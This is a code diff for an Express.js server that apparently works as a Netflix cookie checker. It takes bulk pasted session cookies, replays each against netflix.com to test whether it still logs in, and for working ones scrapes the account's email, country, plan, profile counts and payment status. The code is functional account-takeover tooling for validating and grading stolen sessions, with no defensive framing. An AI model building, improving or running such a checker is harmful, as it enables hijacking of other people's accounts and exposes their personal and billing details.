@@ -12,7 +12,7 @@ app.use(express.json());
    SERVE FRONTEND
 ========================= */
 
-const __dirname = new URL('.', import.meta.url).pathname;
+const __dirname = new URL(".", import.meta.url).pathname;
 
 app.use(express.static("dist"));
 
@@ -36,7 +36,6 @@ function convertCookieFormat(raw) {
     line = line.trim();
     if (!line) continue;
 
-    // remove extra info after |
     if (line.includes("|")) {
       line = line.split("|")[0].trim();
     }
@@ -44,6 +43,7 @@ function convertCookieFormat(raw) {
     // JSON cookies
     if (line.startsWith("[") || line.startsWith("{")) {
       try {
+
         const json = JSON.parse(line);
 
         if (Array.isArray(json)) {
@@ -53,6 +53,7 @@ function convertCookieFormat(raw) {
         }
 
         continue;
+
       } catch {}
     }
 
@@ -78,15 +79,6 @@ function convertCookieFormat(raw) {
 
   return cookies.join("; ");
 }
-    // Already in header format
-    else if (line.includes("=") && !line.includes("\t")) {
-      cookies.push(line);
-    }
-
-  }
-
-  return cookies.join("; ");
-}
 
 /* =========================
    CHECK API
@@ -94,124 +86,94 @@ function convertCookieFormat(raw) {
 
 app.post("/api/check", async (req, res) => {
 
-  let { cookie } = req.body;
-
-const cookieList = cookie
-  .split("\n")
-  .map(c => convertCookieFormat(c))
-  .filter(Boolean); 
+  const { cookie } = req.body;
 
   if (!cookie) {
     return res.json({ status: "INVALID" });
   }
 
+  const cookieList = cookie
+    .split("\n")
+    .map(c => convertCookieFormat(c))
+    .filter(Boolean);
+
   try {
 
-    cookie = convertCookieFormat(cookie);
+    for (const ck of cookieList) {
 
-    const response = await fetch("https://www.netflix.com/browse", {
-  headers: {
-    cookie: cookie,
-    "user-agent": "Mozilla/5.0"
-  },
-  redirect: "follow"
-});
+      const response = await fetch("https://www.netflix.com/browse", {
+        headers: {
+          "user-agent": "Mozilla/5.0",
+          "cookie": ck
+        }
+      });
 
-for (const ck of cookieList) {
+      const text = await response.text();
 
-  const response = await fetch("https://www.netflix.com/browse", {
-    headers: {
-      "user-agent": "Mozilla/5.0",
-      "cookie": ck
+      if (!text.includes("profilesGate")) continue;
+
+      /* =========================
+         PARSE ACCOUNT DATA
+      ========================= */
+
+      let plan = "UNKNOWN";
+
+      if (text.toLowerCase().includes("premium")) plan = "PREMIUM";
+      else if (text.toLowerCase().includes("standard")) plan = "STANDARD";
+      else if (text.toLowerCase().includes("basic")) plan = "BASIC";
+      else if (text.toLowerCase().includes("mobile")) plan = "MOBILE";
+
+      let country = "UNKNOWN";
+      const countryMatch = text.match(/"currentCountry":"(.*?)"/);
+
+      if (countryMatch) country = countryMatch[1];
+
+      let email = "UNKNOWN";
+      const emailMatch = text.match(/"email":"(.*?)"/);
+
+      if (emailMatch) email = emailMatch[1];
+
+      let profiles = 0;
+      const profileMatches = text.match(/profileName/g);
+
+      if (profileMatches) profiles = profileMatches.length;
+
+      let kidsProfiles = 0;
+      const kidsMatch = text.match(/"isKids":true/g);
+
+      if (kidsMatch) kidsProfiles = kidsMatch.length;
+
+      let extraMembers = "NONE";
+
+      if (text.toLowerCase().includes("extra member")) {
+        extraMembers = "AVAILABLE";
+      }
+
+      let paymentStatus = "UNKNOWN";
+
+      if (
+        text.toLowerCase().includes("visa") ||
+        text.toLowerCase().includes("mastercard") ||
+        text.toLowerCase().includes("paypal") ||
+        text.toLowerCase().includes("billing")
+      ) {
+        paymentStatus = "ACTIVE";
+      }
+
+      return res.json({
+        status: "VALID",
+        plan,
+        country,
+        profiles,
+        kidsProfiles,
+        extraMembers,
+        email,
+        paymentStatus
+      });
+
     }
-  });
 
-  const text = await response.text();
-
-  if (!text.includes("profilesGate")) {
-    continue;
-  }
-
-  return res.json({
-    status: "VALID",
-    cookie: ck
-  });
-
-}
-
-return res.json({ status: "INVALID" });
-
-
-   /* =========================
-   PARSE ACCOUNT DATA
-========================= */
-
-let plan = "UNKNOWN";
-
-if (text.toLowerCase().includes("premium")) plan = "PREMIUM";
-else if (text.toLowerCase().includes("standard")) plan = "STANDARD";
-else if (text.toLowerCase().includes("basic")) plan = "BASIC";
-else if (text.toLowerCase().includes("mobile")) plan = "MOBILE";
-
-
-let country = "UNKNOWN";
-const countryMatch = text.match(/"currentCountry":"(.*?)"/);
-
-if (countryMatch) {
-  country = countryMatch[1];
-}
-
-
-let email = "UNKNOWN";
-const emailMatch = text.match(/"email":"(.*?)"/);
-
-if (emailMatch) {
-  email = emailMatch[1];
-}
-
-
-let profiles = 0;
-const profileMatches = text.match(/profileName/g);
-
-if (profileMatches) {
-  profiles = profileMatches.length;
-}
-
-
-let kidsProfiles = 0;
-const kidsMatch = text.match(/"isKids":true/g);
-
-if (kidsMatch) {
-  kidsProfiles = kidsMatch.length;
-}
-
-
-let extraMembers = "NONE";
-
-if (text.toLowerCase().includes("extra member")) {
-  extraMembers = "AVAILABLE";
-}
-
-
-let paymentStatus = "UNKNOWN";
-
-if (text.toLowerCase().includes("visa") ||
-    text.toLowerCase().includes("mastercard") ||
-    text.toLowerCase().includes("paypal") ||
-    text.toLowerCase().includes("billing")) {
-
-  paymentStatus = "ACTIVE";
-}
-    res.json({
-      status: "VALID",
-      plan,
-      country,
-      profiles,
-      kidsProfiles,
-      extraMembers,
-      email,
-      paymentStatus
-    });
+    return res.json({ status: "INVALID" });
 
   } catch (err) {
 
